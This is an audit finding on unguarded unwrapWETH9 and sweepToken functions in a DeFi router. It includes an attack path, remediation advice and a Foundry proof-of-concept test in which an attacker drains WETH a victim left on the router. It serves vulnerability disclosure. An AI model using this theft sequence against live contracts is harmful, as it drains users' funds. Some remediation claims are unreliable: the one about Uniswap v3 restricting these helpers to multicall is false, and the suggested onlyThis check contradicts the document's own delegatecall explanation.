### Title
Unguarded `unwrapWETH9` and `sweepToken` allow any caller to steal WETH/tokens left on the router — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`unwrapWETH9` and `sweepToken` are `public payable` with no access control and accept a fully attacker-controlled `recipient`. Any caller can drain the router's entire WETH or ERC-20 balance to an arbitrary address at any time.

---

### Finding Description

`unwrapWETH9` reads the router's full WETH balance and transfers it as ETH to the caller-supplied `recipient` with no check on `msg.sender`: [1](#0-0) 

`sweepToken` has the identical pattern for arbitrary ERC-20 tokens: [2](#0-1) 

The intended usage pattern (confirmed by the test suite) is to combine a swap with `recipient=address(router)` and `unwrapWETH9` atomically inside a single `multicall`: [3](#0-2) 

However, nothing enforces that users must use `multicall`. A user who calls `exactInputSingle(tokenOut=WETH, recipient=router)` as a standalone transaction leaves WETH on the router until their follow-up `unwrapWETH9` call. That window is exploitable.

---

### Impact Explanation

**Direct theft of user ETH principal — HIGH.**

Attack path:
1. Victim calls `exactInputSingle(tokenIn=USDC, tokenOut=WETH, recipient=address(router))` as a standalone transaction. WETH lands on the router.
2. Attacker (or MEV bot) calls `unwrapWETH9(0, attacker)` in the next block (or front-runs the victim's own `unwrapWETH9` call).
3. The router unwraps its entire WETH balance and sends ETH to the attacker. The victim receives nothing.

Because `amountMinimum=0` is accepted and the victim's subsequent `unwrapWETH9` call silently succeeds with a zero balance, the victim has no on-chain indication of the theft.

The same path applies to `sweepToken` for any ERC-20 output token routed through the contract.

---

### Likelihood Explanation

- The pattern of calling swap + unwrap as two separate transactions is natural for users who do not know they must use `multicall`.
- MEV bots routinely monitor mempools for profitable `unwrapWETH9(0, attacker)` opportunities on routers.
- No special privilege, malicious pool, or non-standard token is required — only a public call to a public function.

---

### Recommendation

Add a `msg.sender == recipient` guard, or restrict these functions to be callable only within a `multicall` context (e.g., via a `onlyThis` modifier that checks `msg.sender == address(this)`). The Uniswap v3 periphery mitigated this by making `unwrapWETH9` and `sweepToken` only callable via `multicall` (delegatecall), so `msg.sender` inside the call is the original transaction sender, not an arbitrary attacker.

Concretely, the simplest fix is:

```solidity
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    require(msg.sender == recipient, "caller must be recipient");
    ...
}
```

Or enforce that these helpers are only reachable through `multicall`'s `delegatecall` path.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
// ... standard test setup

function test_attacker_steals_victim_weth() public {
    uint128 amountIn = 3_000;

    // tx1: victim swaps USDC -> WETH, leaving WETH on router
    vm.prank(victim);
    router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(usdc),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: address(router),   // <-- WETH lands on router
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "weth on router");

    // tx2: attacker drains it
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // no access control

    assertEq(weth.balanceOf(address(router)), 0, "router drained");
    assertEq(attacker.balance - attackerEthBefore, routerWeth, "attacker got victim ETH");
}
```
